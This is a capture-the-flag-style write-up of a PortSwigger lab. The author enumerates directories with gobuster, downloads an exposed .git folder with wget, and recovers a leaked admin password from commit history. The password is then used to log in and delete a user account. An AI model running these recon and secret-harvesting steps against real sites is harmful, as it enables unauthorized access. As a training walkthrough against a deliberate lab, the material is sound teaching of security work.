# Information disclosure in version control history

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history), you'll learn: Information disclosure in version control history! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete Carlos's account.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Information-Disclosure/ID-5/images/Pasted%20image%2020221216061726.png)

**Let's enumerate hidden directories via `gobuster`!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Information-Disclosure/ID-5]
└─# gobuster dir -u https://0a47009c044c09ccc04c188e005e0021.web-security-academy.net/ -w /usr/share/wordlists/dirb/common.txt -t 40 
[...]
/.git/HEAD            (Status: 200) [Size: 23]
[...]
```

**In here, we found a `/.git` directory! Which is the a GitHub repository directory!**

**Let's download all the files via `wget`!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Information-Disclosure/ID-5]
└─# wget -r https://0a47009c044c09ccc04c188e005e0021.web-security-academy.net/.git

┌──(root🌸siunam)-[~/…/Information-Disclosure/ID-5]
└─# cd 0a47009c044c09ccc04c188e005e0021.web-security-academy.net/.git;ls -lah               
total 52K
drwxr-xr-x  7 root root 4.0K Dec 16 06:25 .
drwxr-xr-x  3 root root 4.0K Dec 16 06:24 ..
-rw-r--r--  1 root root   34 Dec 16 06:24 COMMIT_EDITMSG
-rw-r--r--  1 root root  152 Dec 16 06:24 config
-rw-r--r--  1 root root   73 Dec 16 06:24 description
-rw-r--r--  1 root root   23 Dec 16 06:24 HEAD
drwxr-xr-x  2 root root 4.0K Dec 16 06:25 hooks
-rw-r--r--  1 root root  225 Dec 16 06:24 index
-rw-r--r--  1 root root 1.2K Dec 16 06:25 index.html
drwxr-xr-x  2 root root 4.0K Dec 16 06:25 info
drwxr-xr-x  3 root root 4.0K Dec 16 06:25 logs
drwxr-xr-x 10 root root 4.0K Dec 16 06:25 objects
drwxr-xr-x  4 root root 4.0K Dec 16 06:25 refs
```

**Now, we can use `git` to view all the commit logs!**
```
┌──(root🌸siunam)-[~/…/Information-Disclosure/ID-5/0a47009c044c09ccc04c188e005e0021.web-security-academy.net/.git]
└─# git log 
commit 06670302fd84e7c4e3133cb66af887286d107065 (HEAD -> master)
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit 9001d061c821c7ec692f8b0a3d53656815f295d0
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

**`Remove admin password from config`... Sounds interesting, let's print that commit:**
```
┌──(root🌸siunam)-[~/…/Information-Disclosure/ID-5/0a47009c044c09ccc04c188e005e0021.web-security-academy.net/.git]
└─# git show 06670302fd84e7c4e3133cb66af887286d107065
commit 06670302fd84e7c4e3133cb66af887286d107065 (HEAD -> master)
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 2972fb2..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=05psjctjzftuafv8menz
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

- Found `administrator` password: `05psjctjzftuafv8menz`

**Let's login as `administrator` and delete user `carlos`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Information-Disclosure/ID-5/images/Pasted%20image%2020221216062911.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Information-Disclosure/ID-5/images/Pasted%20image%2020221216062919.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Information-Disclosure/ID-5/images/Pasted%20image%2020221216062936.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Information-Disclosure/ID-5/images/Pasted%20image%2020221216062943.png)

We did it!

# What we've learned:

1. Information disclosure in version control history